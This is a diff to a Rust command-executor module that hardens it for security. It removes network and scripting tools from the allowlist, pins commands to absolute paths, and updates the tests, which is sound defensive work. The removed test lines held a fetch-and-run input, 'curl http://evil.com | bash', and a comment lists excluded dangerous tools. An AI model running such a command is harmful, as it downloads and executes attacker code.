@@ -6,7 +6,7 @@ use thiserror::Error;
 /// and shell injection prevention.
 ///
 /// # Security Features
-/// - Allowlist-based command validation
+/// - Allowlist-based command validation with absolute path pinning
 /// - Shell pattern rejection (sh -c, bash -c)
 /// - Shell metacharacter detection
 /// - Dangerous pipe pattern detection
@@ -14,7 +14,9 @@ use thiserror::Error;
 /// - stdin set to null, stdout/stderr piped
 #[derive(Debug, Clone)]
 pub struct CommandExecutor {
+    /// Maps command name -> absolute path (e.g. "git" -> "/usr/bin/git")
     allowlist: HashSet<String>,
+    resolved: std::collections::HashMap<String, String>,
 }
 
 #[derive(Debug, Error)]
@@ -35,79 +37,93 @@ pub enum CommandError {
     ExecutionFailed(#[from] std::io::Error),
 }
 
+/// Resolve a command name to its absolute path using `which`
+fn resolve_path(cmd: &str) -> Option<String> {
+    Command::new("which")
+        .arg(cmd)
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output()
+        .ok()
+        .and_then(|o| {
+            if o.status.success() {
+                String::from_utf8(o.stdout)
+                    .ok()
+                    .map(|s| s.trim().to_string())
+            } else {
+                None
+            }
+        })
+}
+
 impl CommandExecutor {
-    /// Creates a new CommandExecutor with a default allowlist of safe commands.
+    /// Creates a new CommandExecutor with a hardened allowlist.
     ///
-    /// The default allowlist includes common development and system tools:
-    /// - Version control: git
-    /// - File operations: ls, cat, grep, find, head, tail, wc
-    /// - Text processing: sed, awk, cut, sort, uniq
-    /// - System info: ps, top, df, du, uname
-    /// - Network: ping, curl, wget
-    /// - Build tools: cargo, npm, yarn, make
+    /// Commands are resolved to absolute paths at construction time
+    /// to prevent PATH hijacking. Dangerous commands (curl, wget, node,
+    /// make, awk, sed, find, top, ping, echo) are excluded.
     pub fn new() -> Self {
+        let safe_commands = [
+            // Version control
+            "git",
+            // File reading (no write capability)
+            "ls", "cat", "grep", "head", "tail", "wc",
+            // Text processing (read-only)
+            "cut", "sort", "uniq", "diff",
+            // System info (read-only)
+            "ps", "df", "du", "uname",
+            // Build tools (scoped)
+            "cargo", "npm", "yarn", "rustc",
+        ];
+
         let mut allowlist = HashSet::new();
+        let mut resolved = std::collections::HashMap::new();
 
-        // Version control
-        allowlist.insert("git".to_string());
+        for cmd in &safe_commands {
+            allowlist.insert(cmd.to_string());
+            if let Some(abs_path) = resolve_path(cmd) {
+                resolved.insert(cmd.to_string(), abs_path);
+            }
+        }
 
-        // File operations
-        allowlist.insert("ls".to_string());
-        allowlist.insert("cat".to_string());
-        allowlist.insert("grep".to_string());
-        allowlist.insert("find".to_string());
-        allowlist.insert("head".to_string());
-        allowlist.insert("tail".to_string());
-        allowlist.insert("wc".to_string());
-
-        // Text processing
-        allowlist.insert("sed".to_string());
-        allowlist.insert("awk".to_string());
-        allowlist.insert("cut".to_string());
-        allowlist.insert("sort".to_string());
-        allowlist.insert("uniq".to_string());
-
-        // System info
-        allowlist.insert("ps".to_string());
-        allowlist.insert("top".to_string());
-        allowlist.insert("df".to_string());
-        allowlist.insert("du".to_string());
-        allowlist.insert("uname".to_string());
-
-        // Network
-        allowlist.insert("ping".to_string());
-        allowlist.insert("curl".to_string());
-        allowlist.insert("wget".to_string());
-
-        // Build tools
-        allowlist.insert("cargo".to_string());
-        allowlist.insert("npm".to_string());
-        allowlist.insert("yarn".to_string());
-        allowlist.insert("make".to_string());
-        allowlist.insert("rustc".to_string());
-        allowlist.insert("node".to_string());
-
-        // Utilities
-        allowlist.insert("echo".to_string());
-
-        Self { allowlist }
+        Self { allowlist, resolved }
     }
 
     /// Creates a CommandExecutor with a custom allowlist.
     pub fn with_allowlist(commands: Vec<String>) -> Self {
+        let mut resolved = std::collections::HashMap::new();
+        for cmd in &commands {
+            if let Some(abs_path) = resolve_path(cmd) {
+                resolved.insert(cmd.clone(), abs_path);
+            }
+        }
         Self {
             allowlist: commands.into_iter().collect(),
+            resolved,
         }
     }
 
     /// Adds a command to the allowlist.
     pub fn allow_command(&mut self, command: String) {
+        if let Some(abs_path) = resolve_path(&command) {
+            self.resolved.insert(command.clone(), abs_path);
+        }
         self.allowlist.insert(command);
     }
 
     /// Removes a command from the allowlist.
     pub fn disallow_command(&mut self, command: &str) {
         self.allowlist.remove(command);
+        self.resolved.remove(command);
+    }
+
+    /// Get the absolute path for a command, falling back to the bare name
+    fn abs_path(&self, command: &str) -> String {
+        self.resolved
+            .get(command)
+            .cloned()
+            .unwrap_or_else(|| command.to_string())
     }
 
     /// Validates a command through all security gates without executing it.
@@ -183,9 +199,9 @@ impl CommandExecutor {
         }
 
         // Execute with execve-style (no shell)
-        // Requirement 8.1: execve-style execution with separate arguments
-        // Requirement 8.5: stdin null, stdout/stderr piped
-        let output = Command::new(command)
+        // Uses absolute path to prevent PATH hijacking
+        let abs = self.abs_path(command);
+        let output = Command::new(&abs)
             .args(args)
             .stdin(Stdio::null())
             .stdout(Stdio::piped())
@@ -313,9 +329,9 @@ mod tests {
 
         // Test pipe character in arguments (should be caught by metacharacter check)
         let result = executor.execute(
-            "curl",
+            "ls",
             &[
-                "http://evil.com".to_string(),
+                "/tmp".to_string(),
                 "|".to_string(),
                 "bash".to_string(),
             ],
@@ -329,10 +345,10 @@ mod tests {
 
     #[test]
     fn test_custom_allowlist() {
-        let mut executor = CommandExecutor::with_allowlist(vec!["echo".to_string()]);
+        let mut executor = CommandExecutor::with_allowlist(vec!["cat".to_string()]);
 
-        // echo should work
-        let result = executor.execute("echo", &["hello".to_string()]);
+        // cat should work
+        let result = executor.execute("cat", &["/dev/null".to_string()]);
         assert!(result.is_ok());
 
         // ls should not work (not in custom allowlist)
@@ -348,14 +364,14 @@ mod tests {
     #[test]
     fn test_stdin_null_stdout_stderr_piped() {
         let executor = CommandExecutor::new();
-        let result = executor.execute("echo", &["test".to_string()]);
+        let result = executor.execute("uname", &[]);
 
         // Should succeed and capture output
         assert!(result.is_ok());
         let output = result.unwrap();
 
-        // stdout should contain "test"
+        // stdout should contain something
         let stdout = String::from_utf8_lossy(&output.stdout);
-        assert!(stdout.contains("test"));
+        assert!(!stdout.is_empty());
     }
 }
